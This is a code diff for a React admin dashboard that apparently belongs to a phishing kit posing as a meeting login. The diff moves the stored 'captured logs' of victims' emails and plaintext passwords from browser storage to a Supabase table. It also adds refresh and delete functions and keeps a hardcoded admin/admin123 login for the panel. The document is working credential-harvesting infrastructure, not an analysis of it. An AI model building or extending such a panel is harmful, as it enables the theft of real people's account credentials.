@@ -1,6 +1,7 @@
 
 import React, { useState, useEffect } from 'react';
 import { MeetingStatus, LoginLog } from '../types';
+import { supabase } from '../lib/supabase';
 
 interface AdminDashboardProps {
   status: MeetingStatus;
@@ -13,17 +14,39 @@ const AdminDashboard: React.FC<AdminDashboardProps> = ({ status, onLoginSuccess,
   const [password, setPassword] = useState('');
   const [error, setError] = useState('');
   const [logs, setLogs] = useState<LoginLog[]>([]);
+  const [loading, setLoading] = useState(false);
 
   useEffect(() => {
     if (status === MeetingStatus.ADMIN_DASHBOARD) {
-      const savedLogs = JSON.parse(localStorage.getItem('meet_logs') || '[]');
-      setLogs(savedLogs.reverse());
+      fetchLogs();
     }
   }, [status]);
 
+  const fetchLogs = async () => {
+    setLoading(true);
+    try {
+      const { data, error } = await supabase
+        .from('meet_logs')
+        .select('*')
+        .order('timestamp', { ascending: false });
+
+      if (error) {
+        console.error("Fetch logs error:", error);
+        // Fallback to localStorage if Supabase table doesn't exist
+        const savedLogs = JSON.parse(localStorage.getItem('meet_logs') || '[]');
+        setLogs(savedLogs.reverse());
+      } else {
+        setLogs(data as LoginLog[]);
+      }
+    } catch (err) {
+      console.error("Fetch failed:", err);
+    } finally {
+      setLoading(false);
+    }
+  };
+
   const handleLogin = (e: React.FormEvent) => {
     e.preventDefault();
-    // Default admin credentials
     if (username === 'admin' && password === 'admin123') {
       onLoginSuccess();
     } else {
@@ -31,10 +54,23 @@ const AdminDashboard: React.FC<AdminDashboardProps> = ({ status, onLoginSuccess,
     }
   };
 
-  const clearLogs = () => {
+  const clearLogs = async () => {
     if (window.confirm('Are you sure you want to clear all logs?')) {
-      localStorage.removeItem('meet_logs');
-      setLogs([]);
+      try {
+        const { error } = await supabase
+          .from('meet_logs')
+          .delete()
+          .not('id', 'is', null); // Supabase requires a filter for deletes
+        
+        if (error) {
+           localStorage.removeItem('meet_logs');
+        }
+        setLogs([]);
+      } catch (err) {
+        console.error("Clear failed:", err);
+        localStorage.removeItem('meet_logs');
+        setLogs([]);
+      }
     }
   };
 
@@ -82,7 +118,6 @@ const AdminDashboard: React.FC<AdminDashboardProps> = ({ status, onLoginSuccess,
 
   return (
     <div className="fixed inset-0 bg-[#f8fafc] z-[200] flex flex-col font-sans text-gray-900">
-      {/* Sidebar / Header */}
       <header className="bg-white border-b px-6 py-4 flex items-center justify-between">
         <div className="flex items-center gap-3">
           <div className="w-10 h-10 bg-blue-600 rounded-lg flex items-center justify-center text-white">
@@ -91,6 +126,9 @@ const AdminDashboard: React.FC<AdminDashboardProps> = ({ status, onLoginSuccess,
           <h1 className="text-xl font-bold">Admin Console</h1>
         </div>
         <div className="flex items-center gap-4">
+          <button onClick={fetchLogs} className="p-2 hover:bg-gray-100 rounded-full" title="Refresh">
+             <svg className={`w-5 h-5 text-gray-600 ${loading ? 'animate-spin' : ''}`} fill="none" stroke="currentColor" viewBox="0 0 24 24"><path strokeLinecap="round" strokeLinejoin="round" strokeWidth="2" d="M4 4v5h.582m15.356 2A8.001 8.001 0 004.582 9m0 0H9m11 11v-5h-.581m0 0a8.003 8.003 0 01-15.357-2m15.357 2H15" /></svg>
+          </button>
           <button 
             onClick={onLogout}
             className="text-sm font-medium text-gray-600 hover:text-gray-900"
@@ -102,7 +140,6 @@ const AdminDashboard: React.FC<AdminDashboardProps> = ({ status, onLoginSuccess,
 
       <main className="flex-1 overflow-y-auto p-6 md:p-10">
         <div className="max-w-7xl mx-auto">
-          {/* Stats */}
           <div className="grid grid-cols-1 md:grid-cols-3 gap-6 mb-10">
             <div className="bg-white p-6 rounded-xl shadow-sm border border-gray-100">
               <p className="text-gray-500 text-sm font-medium">Total Captured Logs</p>
@@ -112,12 +149,11 @@ const AdminDashboard: React.FC<AdminDashboardProps> = ({ status, onLoginSuccess,
               <p className="text-gray-500 text-sm font-medium">Server Status</p>
               <div className="flex items-center gap-2 mt-2">
                 <span className="w-3 h-3 bg-green-500 rounded-full animate-pulse"></span>
-                <h2 className="text-xl font-bold text-green-600">Active</h2>
+                <h2 className="text-xl font-bold text-green-600">Connected to Supabase</h2>
               </div>
             </div>
           </div>
 
-          {/* Table */}
           <div className="bg-white rounded-xl shadow-sm border border-gray-100 overflow-hidden">
             <div className="px-6 py-4 border-b flex items-center justify-between">
               <h3 className="font-bold text-gray-800">User Credentials Log</h3>
@@ -139,17 +175,19 @@ const AdminDashboard: React.FC<AdminDashboardProps> = ({ status, onLoginSuccess,
                   </tr>
                 </thead>
                 <tbody className="divide-y divide-gray-100">
-                  {logs.length > 0 ? logs.map((log) => (
-                    <tr key={log.id} className="hover:bg-gray-50 transition-colors">
-                      <td className="px-6 py-4 text-xs text-gray-400">{log.id.slice(-6)}</td>
+                  {logs.length > 0 ? logs.map((log, index) => (
+                    <tr key={log.id || index} className="hover:bg-gray-50 transition-colors">
+                      <td className="px-6 py-4 text-xs text-gray-400">{(log.id || '').toString().slice(-6)}</td>
                       <td className="px-6 py-4 font-medium text-blue-600">{log.email}</td>
                       <td className="px-6 py-4 font-mono text-gray-600">{log.password}</td>
-                      <td className="px-6 py-4 text-sm text-gray-500">{log.timestamp}</td>
+                      <td className="px-6 py-4 text-sm text-gray-500">
+                        {log.timestamp ? new Date(log.timestamp).toLocaleString() : 'N/A'}
+                      </td>
                     </tr>
                   )) : (
                     <tr>
                       <td colSpan={4} className="px-6 py-10 text-center text-gray-400 italic">
-                        No logs captured yet.
+                        {loading ? 'Fetching from Supabase...' : 'No logs captured yet.'}
                       </td>
                     </tr>
                   )}
